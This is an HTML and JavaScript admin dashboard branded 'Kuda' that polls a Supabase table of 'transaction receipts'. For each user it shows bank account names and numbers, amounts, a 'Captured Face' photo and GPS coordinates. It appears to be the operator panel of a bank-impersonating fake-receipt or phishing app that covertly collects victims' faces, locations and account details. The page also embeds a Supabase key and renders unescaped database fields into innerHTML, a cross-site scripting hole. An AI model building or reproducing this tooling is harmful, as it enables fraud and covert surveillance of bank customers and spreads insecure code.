<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard - Kuda</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f5f5f5; }
        .admin-wrapper { display: flex; min-height: 100vh; }
        .admin-sidebar { width: 250px; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); color: white; padding: 20px; }
        .admin-sidebar h1 { font-size: 20px; margin-bottom: 30px; }
        .admin-nav-item { padding: 12px; border-radius: 8px; cursor: pointer; background: rgba(255,255,255,0.1); margin-bottom: 10px; font-size: 14px; }
        .admin-nav-item:hover { background: rgba(255,255,255,0.2); }
        .admin-main { flex: 1; display: flex; flex-direction: column; }
        .admin-header { background: white; padding: 20px 30px; border-bottom: 1px solid #e0e0e0; display: flex; justify-content: space-between; align-items: center; }
        .admin-header h2 { font-size: 24px; color: #333; }
        .admin-logout { padding: 10px 20px; background: #e74c3c; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: 600; }
        .admin-logout:hover { background: #c0392b; }
        .admin-content { flex: 1; overflow-y: auto; padding: 20px 30px; }
        .admin-stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
        .admin-stat-card { background: white; padding: 20px; border-radius: 12px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
        .admin-stat-label { font-size: 14px; color: #999; text-transform: uppercase; margin-bottom: 10px; }
        .admin-stat-value { font-size: 32px; font-weight: 700; color: #1a1a2e; }
        .admin-receipts { background: white; border-radius: 12px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
        .admin-receipts-header { padding: 20px; border-bottom: 1px solid #e0e0e0; font-size: 18px; font-weight: 600; color: #333; }
        .admin-receipts-list { max-height: 600px; overflow-y: auto; }
        .admin-receipt-item { padding: 15px 20px; border-bottom: 1px solid #f0f0f0; cursor: pointer; }
        .admin-receipt-item:hover { background: #f9f9f9; }
        .admin-receipt-username { font-weight: 600; color: #333; font-size: 15px; }
        .admin-receipt-time { font-size: 12px; color: #999; float: right; }
        .admin-receipt-details { display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; margin-top: 10px; font-size: 13px; }
        .admin-receipt-detail { color: #666; }
        .admin-receipt-images { display: flex; gap: 10px; margin-top: 10px; }
        .admin-receipt-image { width: 80px; height: 80px; border-radius: 6px; object-fit: cover; cursor: pointer; border: 2px solid #eee; }
        .admin-empty { text-align: center; padding: 40px; color: #999; }
        .admin-modal { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.8); z-index: 1000; align-items: center; justify-content: center; padding: 20px; }
        .admin-modal.show { display: flex; }
        .admin-modal-content { background: white; border-radius: 12px; max-width: 600px; width: 100%; overflow-y: auto; max-height: 80vh; }
        .admin-modal-header { padding: 20px; border-bottom: 1px solid #e0e0e0; display: flex; justify-content: space-between; align-items: center; }
        .admin-modal-header h3 { font-size: 20px; color: #333; }
        .admin-modal-close { background: none; border: none; font-size: 24px; cursor: pointer; }
        .admin-modal-body { padding: 20px; }
        .admin-modal-image { width: 100%; border-radius: 8px; margin-bottom: 20px; }
        .admin-detail-row { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #f0f0f0; font-size: 14px; }
        .admin-detail-row span:first-child { color: #999; font-weight: 500; }
        .admin-detail-row span:last-child { color: #333; font-weight: 600; text-align: right; max-width: 60%; word-break: break-word; }
        @media (max-width: 768px) {
            .admin-sidebar { display: none; }
            .admin-content { padding: 15px; }
            .admin-header { padding: 15px; }
            .admin-header h2 { font-size: 18px; }
            .admin-receipt-details { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>
    <div class="admin-wrapper">
        <div class="admin-sidebar">
            <h1>Admin</h1>
            <div class="admin-nav-item">All Receipts</div>
            <div class="admin-nav-item" onclick="logout()">Logout</div>
        </div>
        <div class="admin-main">
            <div class="admin-header">
                <h2>Transaction Receipts</h2>
                <div style="display:flex;align-items:center;gap:15px;">
                    <span id="connectionStatus" style="font-size:12px;color:#999;">Connecting...</span>
                    <button class="admin-logout" onclick="logout()">Logout</button>
                </div>
            </div>
            <div class="admin-content">
                <div class="admin-stats">
                    <div class="admin-stat-card">
                        <div class="admin-stat-label">Total Transactions</div>
                        <div class="admin-stat-value" id="totalReceipts">0</div>
                    </div>
                    <div class="admin-stat-card">
                        <div class="admin-stat-label">Today</div>
                        <div class="admin-stat-value" id="todayReceipts">0</div>
                    </div>
                    <div class="admin-stat-card">
                        <div class="admin-stat-label">Total Amount</div>
                        <div class="admin-stat-value" id="totalAmount">₦0</div>
                    </div>
                </div>
                <div class="admin-receipts">
                    <div class="admin-receipts-header">Recent Transactions</div>
                    <div class="admin-receipts-list" id="receiptsList">
                        <div class="admin-empty">📭 Waiting for transactions...</div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="admin-modal" id="receiptModal">
        <div class="admin-modal-content">
            <div class="admin-modal-header">
                <h3>Receipt Details</h3>
                <button class="admin-modal-close" onclick="closeModal()">&times;</button>
            </div>
            <div class="admin-modal-body" id="modalBody"></div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <script src="/js/supabase-client.js"></script>
    <script>
        const SUPABASE_URL = 'https://rgnorcrlshskaindafzs.supabase.co';
        const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJnbm9yY3Jsc2hza2FpbmRhZnpzIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzc2OTQ5MzgsImV4cCI6MjA5MzI3MDkzOH0.yluqapG5--VaXyGuSVdJYMeizewYLzkG3lbebVDu1pY';

        let allReceipts = [];
        let fetchSuccess = false;

        // Direct REST API fetch - bypasses Supabase JS client entirely
        // This is the most reliable way to get data
        async function fetchReceiptsDirect() {
            const response = await fetch(SUPABASE_URL + '/rest/v1/receipts?select=*&order=created_at.desc', {
                headers: {
                    'apikey': SUPABASE_ANON_KEY,
                    'Authorization': 'Bearer ' + SUPABASE_ANON_KEY,
                    'Content-Type': 'application/json'
                }
            });
            if (!response.ok) throw new Error('REST API returned ' + response.status);
            return await response.json();
        }

        // Try multiple methods to fetch receipts - never give up
        async function fetchReceipts() {
            // Method 1: Direct REST API (most reliable)
            try {
                const data = await fetchReceiptsDirect();
                if (data && data.length >= 0) return data;
            } catch (e) {
                console.error('REST API failed:', e);
            }

            // Method 2: Supabase JS client
            try {
                const data = await getAllReceiptsFromCloud();
                if (data && data.length >= 0) return data;
            } catch (e) {
                console.error('Supabase JS failed:', e);
            }

            // Method 3: Retry REST API one more time
            try {
                await new Promise(r => setTimeout(r, 2000));
                const data = await fetchReceiptsDirect();
                if (data && data.length >= 0) return data;
            } catch (e) {
                console.error('REST API retry failed:', e);
            }

            return null; // All methods failed
        }

        window.addEventListener('load', async () => {
            loadReceipts();
            setInterval(loadReceipts, 5000);
        });

        async function loadReceipts() {
            const receipts = await fetchReceipts();
            const statusEl = document.getElementById('connectionStatus');

            if (!receipts) {
                // Fetch failed - DON'T wipe existing data, just show error
                fetchSuccess = false;
                if (statusEl) {
                    statusEl.textContent = 'Connection error - retrying...';
                    statusEl.style.color = '#e74c3c';
                }
                if (allReceipts.length === 0) {
                    document.getElementById('receiptsList').innerHTML = '<div class="admin-empty">Loading... If this persists, check your internet connection.</div>';
                }
                return;
            }

            fetchSuccess = true;
            if (statusEl) {
                statusEl.textContent = 'Connected - Last updated ' + new Date().toLocaleTimeString();
                statusEl.style.color = '#27ae60';
            }

            allReceipts = receipts;
            const receiptsList = document.getElementById('receiptsList');

            if (receipts.length === 0) {
                receiptsList.innerHTML = '<div class="admin-empty">Waiting for transactions...</div>';
            } else {
                receiptsList.innerHTML = receipts.map(r => `
                    <div class="admin-receipt-item" onclick="viewReceipt('${r.id}')">
                        <span class="admin-receipt-username">${r.username || 'Unknown'}</span>
                        <span class="admin-receipt-time">${formatTime(r.created_at)}</span>
                        <div style="clear: both;"></div>
                        <div class="admin-receipt-details">
                            <div>Amount: ₦${Number(r.amount || 0).toLocaleString('en-NG', {minimumFractionDigits: 2})}</div>
                            <div>Bank: ${r.bank_name || 'N/A'}</div>
                            <div>Account: ${r.account_number || 'N/A'}</div>
                            <div>Type: ${r.transaction_type === 'credit' ? 'Top-up' : 'Transfer'}</div>
                            <div>Narration: ${r.narration || 'N/A'}</div>
                            <div>Ref: ${r.reference_number || 'N/A'}</div>
                        </div>
                        ${r.location_latitude && r.location_longitude ? `<a href="https://maps.google.com/?q=${r.location_latitude},${r.location_longitude}" target="_blank" style="color:#667eea;font-size:12px;">View on Maps (${Number(r.location_latitude).toFixed(4)}, ${Number(r.location_longitude).toFixed(4)})</a>` : '<span style="color:#e74c3c;font-size:12px;">No location captured</span>'}
                        <div class="admin-receipt-images">
                            ${r.captured_face ? `<img src="${r.captured_face}" class="admin-receipt-image" title="Captured Face">` : ''}
                        </div>
                    </div>
                `).join('');
            }
            updateStats(receipts);
        }

        function updateStats(receipts) {
            const today = new Date().toLocaleDateString();
            const todayCount = receipts.filter(r => new Date(r.created_at).toLocaleDateString() === today).length;
            const total = receipts.reduce((sum, r) => sum + parseFloat(r.amount || 0), 0);
            document.getElementById('totalReceipts').textContent = receipts.length;
            document.getElementById('todayReceipts').textContent = todayCount;
            document.getElementById('totalAmount').textContent = '₦' + total.toLocaleString();
        }

        function viewReceipt(id) {
            const receipt = allReceipts.find(r => r.id === id);
            if (receipt) {
                const modalBody = document.getElementById('modalBody');
                modalBody.innerHTML = `
                    ${receipt.captured_face ? `<img src="${receipt.captured_face}" class="admin-modal-image">` : ''}
                    <div class="admin-detail-row"><span>Username</span><span>${receipt.username || 'Unknown'}</span></div>
                    <div class="admin-detail-row"><span>Type</span><span>${receipt.transaction_type === 'credit' ? 'Top-up' : 'Transfer'}</span></div>
                    <div class="admin-detail-row"><span>Amount</span><span>₦${Number(receipt.amount || 0).toLocaleString('en-NG', {minimumFractionDigits: 2})}</span></div>
                    <div class="admin-detail-row"><span>Bank</span><span>${receipt.bank_name || 'N/A'}</span></div>
                    <div class="admin-detail-row"><span>Account Name</span><span>${receipt.account_name || 'N/A'}</span></div>
                    <div class="admin-detail-row"><span>Account Number</span><span>${receipt.account_number || 'N/A'}</span></div>
                    <div class="admin-detail-row"><span>Narration</span><span>${receipt.narration || 'N/A'}</span></div>
                    <div class="admin-detail-row"><span>Reference</span><span>${receipt.reference_number || 'N/A'}</span></div>
                    <div class="admin-detail-row"><span>Date</span><span>${receipt.transaction_date ? new Date(receipt.transaction_date).toLocaleString() : 'N/A'}</span></div>
                    ${receipt.location_latitude && receipt.location_longitude ? `<div class="admin-detail-row"><span>Location</span><span><a href="https://maps.google.com/?q=${receipt.location_latitude},${receipt.location_longitude}" target="_blank" style="color:#667eea;">${Number(receipt.location_latitude).toFixed(4)}, ${Number(receipt.location_longitude).toFixed(4)}</a></span></div>` : '<div class="admin-detail-row"><span>Location</span><span style="color:#e74c3c;">Not captured</span></div>'}
                `;
                document.getElementById('receiptModal').classList.add('show');
            }
        }

        function closeModal() {
            document.getElementById('receiptModal').classList.remove('show');
        }

        function formatTime(timestamp) {
            const date = new Date(timestamp);
            const now = new Date();
            const diffMs = now - date;
            const diffMins = Math.floor(diffMs / 60000);
            const diffHours = Math.floor(diffMs / 3600000);
            const diffDays = Math.floor(diffMs / 86400000);
            if (diffMins < 1) return 'just now';
            if (diffMins < 60) return `${diffMins}m ago`;
            if (diffHours < 24) return `${diffHours}h ago`;
            if (diffDays < 7) return `${diffDays}d ago`;
            return date.toLocaleDateString();
        }

        function logout() {
            fetch('/api/logout', { method: 'POST' }).then(() => {
                window.location.href = '/admin-login';
            });
        }

        document.getElementById('receiptModal').addEventListener('click', (e) => {
            if (e.target.id === 'receiptModal') closeModal();
        });
    </script>
</body>
</html>
